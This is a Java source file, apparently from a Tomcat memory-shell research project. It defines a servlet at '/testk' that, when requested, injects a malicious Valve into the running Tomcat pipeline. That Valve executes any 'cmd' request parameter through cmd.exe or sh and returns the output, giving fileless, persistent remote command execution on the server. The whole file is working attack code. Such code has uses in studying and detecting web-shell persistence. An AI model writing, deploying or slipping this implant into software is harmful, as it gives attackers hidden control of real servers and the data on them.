package com.tomcat.memshell.Valve;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.valves.ValveBase;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebServlet("/testk")
public class KoishiValve extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
            standardContext.getPipeline().addValve(new ValveShell());
            resp.getWriter().write("Evil Valve inject success!");
        } catch (Exception e) {

        }
    }
    class ValveShell extends ValveBase {
        String cmdParamName ="cmd";
        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            try {
                String cmd = request.getParameter(cmdParamName);
                if(cmd!=null) {
                    String[] cmds = null;
                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
                        cmds = new String[]{"cmd.exe", "/c", cmd};
                    } else {
                        cmds = new String[]{"sh", "-c", cmd};
                    }

                    java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
                    String output = s.hasNext() ? s.next() : "";
                    java.io.Writer writer = response.getWriter();
                    response.getWriter().write("smail evil valve isComing!!!\n");
                    writer.write(output);
                    writer.flush();
                    writer.close();
                    this.getNext().invoke(request, response);
                }
            } catch (Exception e) {

            }
        }
    }
}